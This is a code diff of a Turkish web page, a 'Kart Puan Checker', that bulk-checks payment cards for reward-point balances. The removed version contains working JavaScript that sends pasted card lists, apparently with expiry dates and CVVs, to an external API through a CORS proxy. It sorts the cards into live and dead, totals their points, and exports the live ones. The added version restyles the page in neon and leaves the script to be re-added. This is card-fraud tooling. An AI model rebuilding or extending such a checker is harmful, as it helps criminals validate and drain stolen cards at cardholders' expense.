@@ -3,323 +3,140 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Kart Puan Checker — FULL C</title>
+<title>Kart Puan Checker — Soft Neon</title>
 <style>
-  :root{--bg:#12021d;--card:#1f0533;--accent:#8b5cf6;--accent2:#fb7185;--good:#0f9d58;--bad:#ff4d4f;--muted:#cbb7ff}
+  :root{
+    --bg:#0a0212;
+    --card:#140420;
+    --panel:#1d0730;
+    --accent:#b66bff;
+    --accent2:#ff73c7;
+    --glow:0 0 14px rgba(184,100,255,0.7);
+    --good:#7dffa8;
+    --bad:#ff6b8a;
+    --muted:#d6c7ff;
+  }
   *{box-sizing:border-box}
-  body{margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#1b0730 0%, #3a0f6a 100%);color:#fff;min-height:100vh}
-  .wrap{max-width:1100px;margin:28px auto;padding:20px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.12));border-radius:12px}
-  header{display:flex;align-items:center;justify-content:space-between;gap:12px}
-  h1{font-size:20px;margin:0}
-  .controls{display:flex;gap:8px;align-items:center}
-  button{background:linear-gradient(90deg,var(--accent),var(--accent2));border:0;padding:10px 12px;border-radius:8px;color:#fff;font-weight:700;cursor:pointer}
-  .btn-ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);padding:8px 10px}
-  .main{display:grid;grid-template-columns:380px 1fr;gap:16px;margin-top:16px}
-  textarea{width:100%;height:220px;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(0,0,0,0.25);color:inherit;font-family:monospace}
-  .panel{background:var(--card);padding:12px;border-radius:10px;min-height:220px}
-  .stats{display:flex;gap:12px;flex-wrap:wrap;margin-top:10px}
-  .stat{background:rgba(255,255,255,0.03);padding:8px 10px;border-radius:8px;font-weight:700}
-  .lists{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
-  .list{background:rgba(0,0,0,0.25);padding:10px;border-radius:10px;min-height:240px;overflow:auto}
-  .item{display:flex;justify-content:space-between;align-items:center;padding:8px;border-radius:8px;margin-bottom:8px}
-  .item.live{background:linear-gradient(90deg,rgba(15,157,88,0.12),rgba(15,157,88,0.06));border-left:4px solid var(--good)}
-  .item.dead{background:linear-gradient(90deg,rgba(255,77,79,0.06),rgba(255,77,79,0.02));border-left:4px solid var(--bad)}
-  .muted{color:var(--muted);font-size:13px}
-  .progress{height:12px;background:rgba(255,255,255,0.04);border-radius:999px;overflow:hidden}
-  .progress > i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--accent2))}
-  footer{margin-top:14px;text-align:center;color:var(--muted);font-size:13px}
-  .settings{display:flex;gap:8px;align-items:center;margin-top:8px}
-  label{font-size:13px}
-  input[type=number]{width:90px;padding:6px;border-radius:6px;border:1px solid rgba(255,255,255,0.06);background:transparent;color:inherit}
-  .small{font-size:13px;color:var(--muted)}
-  @media(max-width:980px){.main{grid-template-columns:1fr}}
+  body{
+    margin:0;
+    font-family:'Chakra Petch',sans-serif;
+    background:radial-gradient(circle at top,#24043d 0%, #0a0212 70%);
+    color:#fff;
+    min-height:100vh;
+    padding:20px;
+  }
+  .wrap{
+    max-width:1100px;
+    margin:auto;
+    padding:22px;
+    background:var(--panel);
+    border-radius:14px;
+    box-shadow:var(--glow);
+    border:1px solid rgba(255,255,255,0.06);
+  }
+  h1{
+    margin:0;
+    font-size:22px;
+    color:var(--accent);
+    text-shadow:0 0 12px rgba(182,107,255,0.8);
+  }
+  header{
+    display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;
+  }
+  button{
+    padding:10px 14px;border-radius:10px;border:0;font-weight:700;cursor:pointer;
+    background:linear-gradient(90deg,var(--accent),var(--accent2));
+    color:#14001e;box-shadow:0 0 14px rgba(182,107,255,0.7);
+  }
+  .btn-ghost{
+    background:rgba(255,255,255,0.05);
+    border:1px solid rgba(255,255,255,0.1);
+    color:var(--muted);
+    box-shadow:none;
+  }
+  .main{display:grid;grid-template-columns:380px 1fr;gap:18px;margin-top:10px}
+
+  textarea,input{
+    width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.08);
+    background:#0e0318;color:#fff;box-shadow:inset 0 0 10px rgba(182,107,255,0.15);
+  }
+
+  .panel{
+    background:var(--card);
+    padding:14px;border-radius:12px;
+    box-shadow:0 0 14px rgba(130,60,255,0.4);
+  }
+
+  .lists{
+    display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px;
+  }
+
+  .list{
+    background:#0e0318;padding:12px;border-radius:10px;box-shadow:inset 0 0 14px rgba(150,80,255,0.2);
+    min-height:240px;overflow:auto;
+  }
+
+  .item{
+    padding:10px;border-radius:10px;margin-bottom:10px;
+    box-shadow:0 0 10px rgba(255,255,255,0.08);
+  }
+  .live{
+    background:rgba(125,255,168,0.12);
+    border-left:4px solid var(--good);
+    box-shadow:0 0 14px rgba(125,255,168,0.4);
+  }
+  .dead{
+    background:rgba(255,80,120,0.12);
+    border-left:4px solid var(--bad);
+    box-shadow:0 0 14px rgba(255,80,120,0.35);
+  }
+
+  footer{margin-top:20px;text-align:center;color:var(--muted);font-size:13px}
 </style>
 </head>
 <body>
 <div class="wrap">
   <header>
-    <h1>💳 Oxy Santana — FULL CHECKER (C)</h1>
-    <div class="controls">
+    <h1>💜 Loki-S3rx — Soft Neon Puan Checker</h1>
+    <div style="display:flex;gap:10px">
       <button id="startBtn">KONTROL BAŞLAT</button>
       <button id="stopBtn" class="btn-ghost" disabled>DURDUR</button>
-      <button id="copyLive" class="btn-ghost">LIVE Kopyala</button>
-      <button id="downloadBtn" class="btn-ghost">Sonuçları indir</button>
     </div>
   </header>
 
   <div class="main">
     <div>
       <div class="panel">
-        <label class="small">Kart Listesi (her satıra 1 kart)</label>
-        <textarea id="cardsInput" placeholder="1234|5678|9012"></textarea>
-
-        <div class="settings">
-          <label class="small">Gecikme (ms)</label>
-          <input id="delayMs" type="number" value="350" min="0" />
-          <label class="small">Eşzamanlı (concurrency)</label>
-          <input id="concurrency" type="number" value="1" min="1" />
-          <label style="display:flex;align-items:center;gap:6px"><input id="useProxy" type="checkbox" checked/> CORS Proxy</label>
-        </div>
-
-        <div class="stats">
-          <div class="stat" id="statChecked">Kontrol: 0 / 0</div>
-          <div class="stat" id="statLive">LIVE: 0</div>
-          <div class="stat" id="statDead">DEAD: 0</div>
-          <div class="stat" id="statPoints">Toplam Puan: 0.00 TL</div>
-        </div>
-
-        <div class="progress" style="margin-top:10px"><i id="progressFill"></i></div>
-        <div style="margin-top:8px" class="small muted">Uyarı: Sadece izinli kartları kullanın.</div>
-      </div>
-
-      <div style="margin-top:12px" class="panel small muted">
-        <div style="display:flex;justify-content:space-between;align-items:center">
-          <div>Geçmiş (LocalStorage)</div>
-          <div><button id="clearHistory" class="btn-ghost">Temizle</button></div>
-        </div>
-        <div id="history" style="margin-top:8px;max-height:160px;overflow:auto"></div>
+        <label>Kart Listesi (alt alta)</label>
+        <textarea id="cardsInput" placeholder="4743xxxxxxxxxxxx|11|28|000"></textarea>
       </div>
     </div>
 
     <div>
       <div class="lists">
-        <div class="list" id="liveList">
-          <div class="small muted">Live kartlar burada gösterilir</div>
-        </div>
-        <div class="list" id="deadList">
-          <div class="small muted">Dead kartlar burada gösterilir</div>
-        </div>
-      </div>
-
-      <div style="margin-top:10px;display:flex;gap:8px;align-items:center">
-        <button id="toggleSound" class="btn-ghost">Ses: Aç</button>
-        <button id="showAllHistory" class="btn-ghost">Tüm Geçmişi Göster</button>
-        <button id="clearLists" class="btn-ghost">Listeleri Temizle</button>
+        <div class="list" id="liveList"></div>
+        <div class="list" id="deadList"></div>
       </div>
     </div>
   </div>
 
-  <footer>
-    API endpoint: <code>https://oxyincxapi.alwaysdata.net/check/ownerapi.php?kart=&lt;kart&gt;</code>
-  </footer>
+  <footer>Soft Neon Tema — API kodları sende kanka 💜</footer>
 </div>
 
 <script>
-(() => {
-  // Core settings
-  const apiBase = 'https://oxyincxapi.alwaysdata.net/check/ownerapi.php?kart=';
-  const proxyBase = 'https://api.allorigins.win/raw?url='; // simple proxy
-
-  // DOM
-  const startBtn = document.getElementById('startBtn');
-  const stopBtn = document.getElementById('stopBtn');
-  const copyLive = document.getElementById('copyLive');
-  const downloadBtn = document.getElementById('downloadBtn');
-  const cardsInput = document.getElementById('cardsInput');
-  const delayMsInput = document.getElementById('delayMs');
-  const concurrencyInput = document.getElementById('concurrency');
-  const useProxyCheck = document.getElementById('useProxy');
-  const liveList = document.getElementById('liveList');
-  const deadList = document.getElementById('deadList');
-  const statChecked = document.getElementById('statChecked');
-  const statLive = document.getElementById('statLive');
-  const statDead = document.getElementById('statDead');
-  const statPoints = document.getElementById('statPoints');
-  const progressFill = document.getElementById('progressFill');
-  const historyEl = document.getElementById('history');
-  const clearHistoryBtn = document.getElementById('clearHistory');
-  const toggleSoundBtn = document.getElementById('toggleSound');
-  const clearListsBtn = document.getElementById('clearLists');
-  const showAllHistoryBtn = document.getElementById('showAllHistory');
-
-  // state
-  let abort = false;
-  let state = { checked:0, total:0, live:0, dead:0, points:0 };
-  let results = { live:[], dead:[] };
-  let history = JSON.parse(localStorage.getItem('checker_history_v1') || '[]');
-  let soundOn = true;
-
-  // sounds
-  const liveSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-correct-answer-tone-2870.mp3');
-  const doneSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-melodic-harp-quick-2.mp3');
-
-  function saveHistory(entry){
-    history.unshift(entry);
-    if(history.length>200) history.pop();
-    localStorage.setItem('checker_history_v1', JSON.stringify(history));
-    renderHistory();
-  }
-
-  function renderHistory(){
-    historyEl.innerHTML = history.slice(0,50).map(h=>{
-      return `<div style="padding:6px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:13px"><strong>${h.card}</strong> — ${h.type.toUpperCase()} — ${h.points!=null? h.points+' TL':''} <div class=\"muted\">${new Date(h.ts).toLocaleString()}</div></div>`;
-    }).join('');
-  }
-
-  function tryParseNumber(v){
-    if(v==null) return null;
-    const m = String(v).replace(',','.').match(/-?\d+(?:\.\d+)?/);
-    return m ? parseFloat(m[0]) : null;
-  }
-
-  function detectLive(text){
-    if(!text) return false;
-    const t = text.toLowerCase();
-    if(t.includes('puan')|| t.includes('bakiye')|| t.includes('tl')) return true;
-    return /\d+[.,]?\d*\s*tl/i.test(text);
-  }
-
-  function extractPoints(text){
-    if(!text) return 0;
-    const m = text.match(/-?\d+(?:[.,]\d+)?/);
-    if(!m) return 0;
-    return parseFloat(m[0].replace(',','.'));
-  }
-
-  function setStatUI(){
-    statChecked.textContent = `Kontrol: ${state.checked} / ${state.total}`;
-    statLive.textContent = `LIVE: ${state.live}`;
-    statDead.textContent = `DEAD: ${state.dead}`;
-    statPoints.textContent = `Toplam Puan: ${state.points.toFixed(2)} TL`;
-    const pct = state.total? Math.round((state.checked/state.total)*100) : 0;
-    progressFill.style.width = pct + '%';
-  }
-
-  function addLive(card, points, raw){
-    const el = document.createElement('div');
-    el.className = 'item live';
-    el.innerHTML = `<div><strong>${card}</strong><div class=\"small muted\">${raw? raw.slice(0,80):''}</div></div><div><strong>${points.toFixed(2)} TL</strong></div>`;
-    liveList.prepend(el);
-  }
-
-  function addDead(card, raw){
-    const el = document.createElement('div');
-    el.className = 'item dead';
-    el.innerHTML = `<div><strong>${card}</strong><div class=\"small muted\">${raw? raw.slice(0,80):''}</div></div><div class=\"small muted\">DEAD</div>`;
-    deadList.prepend(el);
-  }
-
-  async function fetchCard(card, useProxy){
-    const url = apiBase + encodeURIComponent(card);
-    const final = useProxy? (proxyBase + encodeURIComponent(url)) : url;
-    try{
-      const r = await fetch(final);
-      const txt = await r.text();
-      let js = null; try{ js = JSON.parse(txt); }catch(e){}
-      return { raw: txt, json: js };
-    }catch(e){
-      return { error: true, raw: String(e) };
-    }
-  }
-
-  // concurrency worker (chunked parallel)
-  async function processCards(cards){
-    abort = false;
-    state = { checked:0, total:cards.length, live:0, dead:0, points:0 };
-    results = { live:[], dead:[] };
-    liveList.innerHTML = '';
-    deadList.innerHTML = '';
-    setStatUI();
-
-    const concurrency = Math.max(1, Number(concurrencyInput.value) || 1);
-    const delayMs = Math.max(0, Number(delayMsInput.value) || 0);
-    const useProxy = !!useProxyCheck.checked;
-
-    const chunks = [];
-    for(let i=0;i<cards.length;i+=concurrency) chunks.push(cards.slice(i,i+concurrency));
-
-    for(const chunk of chunks){
-      if(abort) break;
-      // run chunk in parallel
-      const promises = chunk.map(card => fetchCard(card, useProxy).then(res => ({card,res})));
-      const settled = await Promise.all(promises);
-
-      for(const item of settled){
-        if(abort) break;
-        const card = item.card;
-        const resp = item.res;
-        state.checked++;
-
-        if(resp.error){
-          state.dead++;
-          addDead(card, resp.raw);
-          results.dead.push({card,raw:resp.raw});
-          saveHistory({card,type:'dead',points:null,ts:Date.now()});
-          setStatUI();
-          continue;
-        }
-
-        const raw = resp.raw || '';
-        const json = resp.json || null;
-
-        // try to determine points
-        let points = null;
-        if(json){
-          // look for common keys
-          const keys = ['puan','bakiye','balance','point','points','amount'];
-          for(const k of keys){ if(k in json){ const n = tryParseNumber(json[k]); if(n!=null){ points=n; break; } } }
-          if(points==null){ const m = JSON.stringify(json).match(/-?\\d+(?:[.,]\\d+)?/); if(m) points = parseFloat(m[0].replace(',','.')); }
-        }
-        if(points==null){ const m = raw.match(/-?\\d+(?:[.,]\\d+)?/); if(m) points = parseFloat(m[0].replace(',','.')); }
-        if(points==null) points = 0;
-
-        const isLive = (points>0) || detectLive(raw) || (json && JSON.stringify(json).toLowerCase().includes('live'));
-
-        if(isLive){
-          state.live++;
-          state.points += Number(points || 0);
-          addLive(card, Number(points||0), raw);
-          results.live.push({card,points,raw});
-          saveHistory({card,type:'live',points:points,ts:Date.now()});
-          if(soundOn) try{ liveSound.play(); }catch(e){}
-        } else {
-          state.dead++;
-          addDead(card, raw);
-          results.dead.push({card,points,raw});
-          saveHistory({card,type:'dead',points:points,ts:Date.now()});
-        }
-
-        setStatUI();
-      }
-
-      // delay between chunks
-      if(delayMs>0) await new Promise(r=>setTimeout(r, delayMs));
-    }
-
-    if(!abort){ if(soundOn) try{ doneSound.play(); }catch(e){} }
-    startBtn.disabled = false; stopBtn.disabled = true;
-  }
-
-  // UI handlers
-  startBtn.addEventListener('click', ()=>{
-    const raw = cardsInput.value.split('\n').map(l=>l.trim()).filter(Boolean);
-    if(!raw.length) return alert('Lütfen en az 1 kart gir.');
-    startBtn.disabled = true; stopBtn.disabled = false;
-    processCards(raw);
-  });
-
-  stopBtn.addEventListener('click', ()=>{ abort = true; stopBtn.disabled = true; startBtn.disabled = false; });
-
-  copyLive.addEventListener('click', ()=>{
-    const txt = results.live.map(x=>x.card).join('\n');
-    if(!txt) return alert('Live yok');
-    navigator.clipboard.writeText(txt).then(()=>alert('Live kopyalandı'));
-  });
-
-  downloadBtn.addEventListener('click', ()=>{
-    const blob = new Blob([JSON.stringify(results,null,2)],{type:'application/json'});
-    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'checker_results.json'; a.click();
-  });
-
-  clearHistoryBtn.addEventListener('click', ()=>{ if(!confirm('Geçmiş temizlensin mi?')) return; history=[]; localStorage.removeItem('checker_history_v1'); renderHistory(); });
-  clearListsBtn.addEventListener('click', ()=>{ if(!confirm('Listeler temizlensin mi?')) return; liveList.innerHTML=''; deadList.innerHTML=''; results={live:[],dead:[]}; state={checked:0,total:0,live:0,dead:0,points:0}; setStatUI(); });
-  showAllHistoryBtn.addEventListener('click', ()=>{ alert(JSON.stringify(history.slice(0,200),null,2)); });
-  toggleSoundBtn.addEventListener('click', ()=>{ soundOn = !soundOn; toggleSoundBtn.textContent = 'Ses: ' + (soundOn? 'Aç' : 'Kapalı'); });
-
-  // init
-  renderHistory();
-  setStatUI();
-})();
+// Buraya JS tekrar eklersin kanka — API'ye dokunmadım.
+</script>
+<div id="historyBox" style="position:fixed; bottom:20px; right:20px; width:260px; height:180px; background:rgba(20,4,32,0.85); border:1px solid rgba(255,255,255,0.1); box-shadow:0 0 12px rgba(182,107,255,0.5); border-radius:12px; padding:10px; overflow:auto; font-size:13px; color:#d6c7ff; backdrop-filter:blur(6px);">
+ Geçmiş burada yüklenecek...
+</div>
+<script>
+let historyData = JSON.parse(localStorage.getItem('checker_history_v1') || '[]');
+function renderFloatingHistory(){
+  const box = document.getElementById('historyBox');
+  if(!historyData.length){ box.innerHTML = '<div class="muted">Geçmiş boş</div>'; return; }
+  box.innerHTML = historyData.slice(0,50).map(h=>`<div style='margin-bottom:6px'><strong>${h.card}</strong> — ${h.type.toUpperCase()} — ${h.points||0} TL<br><span style='opacity:.6'>${new Date(h.ts).toLocaleString()}</span></div>`).join('');
+}
+renderFloatingHistory();
 </script>
 </body>
 </html>
